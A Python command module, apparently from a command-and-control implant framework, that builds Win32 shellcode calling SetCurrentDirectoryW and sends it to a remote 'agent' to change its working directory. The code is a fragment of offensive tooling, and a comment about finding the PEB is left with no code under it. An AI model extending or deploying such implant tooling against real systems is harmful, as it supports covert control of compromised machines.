NAME = "cd"
DESCRIPTION = "Sets the current directory for the specified process (Win32)"
PARAMS = [
    {"name":"path", "description":"Full path to the directory", "type":"str"},
]
DEPENDENCIES = [] 
DEFAULT = True

def SetCurrentDirectoryW_Payload(agent_id, path):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import push_rtl, build_ptr
    import struct

    agent = Agent.by_id(agent_id)
    # Resolve SetCurrentDirectoryW from kernel32.dll
    func_addr = Syscall.sys(agent.id, "SetCurrentDirectoryW")
    
    # The scratchpad will hold our null-terminated Unicode string
    scratchpad = agent.scratchpad
    
    # 1. Prepare the Unicode string data (UTF-16LE with null-terminator)
    # Windows expects two null bytes at the end for Unicode strings
    path_encoded = path.encode('utf-16le') + b'\x00\x00'
    path_data, next_ptr = build_ptr(scratchpad, path_encoded)
    
    # 2. Setup the calling parameters
    # RCX = Pointer to the path string in the scratchpad
    params = [
        scratchpad,  # P1: RCX (lpPathName)
    ]
    
    # 3. Generate the shellcode to call the function
    shellcode = push_rtl(func_addr, params, agent.debug)
    
    return path_data, shellcode

def function(agent_id, args):
    from services.orders import write_scratchpad, read_from_agent, send_and_wait
    import struct
    path_data, shellcode = SetCurrentDirectoryW_Payload(agent_id, args[0])
    write_scratchpad(agent_id, path_data)
    send_and_wait(agent_id, shellcode)
    new_dir = args[0]

    # 1. FIND THE PEB
    

    return {
        "retval": 0,
        "NewDirectory": new_dir,
    }